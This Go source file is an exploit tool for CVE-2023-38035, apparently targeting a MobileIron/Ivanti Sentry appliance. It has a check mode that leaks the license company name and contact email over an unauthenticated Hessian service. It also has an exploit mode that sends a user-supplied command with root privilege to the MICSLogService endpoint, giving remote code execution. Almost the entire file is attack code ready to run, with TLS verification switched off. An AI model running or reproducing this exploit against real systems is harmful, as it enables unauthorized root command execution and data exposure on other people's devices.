package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"reflect"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/ggwhite/go-hessian"
)

func main() {
	target := flag.String("target", "", "Target in format: ip, ip:port, or protocol://ip:port")
	cmd := flag.String("cmd", "", "Command to execute")
	mode := flag.String("mode", "check", "Mode of operation: check or exploit")
	flag.Parse()

	if *target == "" {
		printColor("[-] Target required.", color.FgMagenta)
		os.Exit(1)
	}

	parsedTarget := parseTarget(*target)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	printHeader()
	switch *mode {
	case "check":
		check(parsedTarget)
	case "exploit":
		if *cmd == "" {
			printColor("[-] Command required for exploit mode.", color.FgMagenta)
			os.Exit(1)
		}
		exploit(parsedTarget, *cmd)
	default:
		printColor("[-] Invalid mode.", color.FgMagenta)
		os.Exit(1)
	}
}

func createHessianProxy(serviceURL string) (*hessian.Proxy, error) {
	clientWithTimeout := &http.Client{
		Timeout: 5 * time.Second,
	}

	proxy, err := hessian.NewProxy(&hessian.ProxyConfig{
		Version: hessian.V1,
		URL:     serviceURL,
		Client:  clientWithTimeout,
	})
	return proxy, err
}

func parseTarget(target string) string {
	if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
		return target
	}
	if strings.Contains(target, ":") {
		return "https://" + target
	}
	return "https://" + target + ":443"
}

func check(baseURL string) {
	serviceURL := fmt.Sprintf("%s/mics/services/ConfigService", baseURL)
	proxy, err := createHessianProxy(serviceURL)
	checkError(err)

	err = proxy.RegisterType(reflect.TypeOf(LicenseSettingsConfDTO{}))
	checkError(err)

	args, err := proxy.Invoke("getApplianceLicenseInfo")
	checkError(err)

	if len(args) != 1 {
		printColor("[-] Exploit unsuccessful.", color.FgMagenta)
		os.Exit(1)
	}

	if licenseInfo, isLicenseInfo := args[0].(LicenseSettingsConfDTO); isLicenseInfo {
		color.New(color.FgCyan, color.Bold).Printf("[+] ")
		color.New(color.FgMagenta, color.Bold).Printf("%s ", baseURL)
		color.New(color.FgCyan, color.Bold).Println("is vulnerable to CVE-2023-38035.")

		color.New(color.FgCyan, color.Bold).Printf("%-10s", "Company:")
		color.New(color.FgMagenta, color.Bold).Println(licenseInfo.CompanyName)
		color.New(color.FgCyan, color.Bold).Printf("%-10s", "Contact:")
		color.New(color.FgMagenta, color.Bold).Println(licenseInfo.ContactEmail)
	}
}

func exploit(baseURL, command string) {
	serviceURL := fmt.Sprintf("%s/mics/services/MICSLogService", baseURL)

	resp, err := http.Get(serviceURL)
	checkError(err)
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusMethodNotAllowed {
		printColor("[-] Endpoint not vulnerable.", color.FgMagenta)
		os.Exit(1)
	}

	dto := map[string]interface{}{
		"command": command,
		"isRoot":  true,
	}

	proxy, err := createHessianProxy(serviceURL)
	checkError(err)

	details, err := proxy.Invoke("uploadFileUsingFileInput", dto, nil)
	checkError(err)

	if details != nil {
		printColor("[+] Command executed successfully.", color.FgCyan)
	}
}

func checkError(err error) {
	if err != nil {
		printColor("[-] "+err.Error(), color.FgMagenta)
		os.Exit(1)
	}
}

func printColor(msg string, clr color.Attribute) {
	color.New(clr, color.Bold).Println(msg)
}

func printHeader() {
	printColor("=============== SENTRY ===============", color.FgCyan)
}

type LicenseSettingsConfDTO struct {
	hessian.Package `hessian:"com.mi.mics.dto.LicenseSettingsConfDTO"`
	CompanyName     string `hessian:"companyName"`
	ContactEmail    string `hessian:"contactEmail"`
}
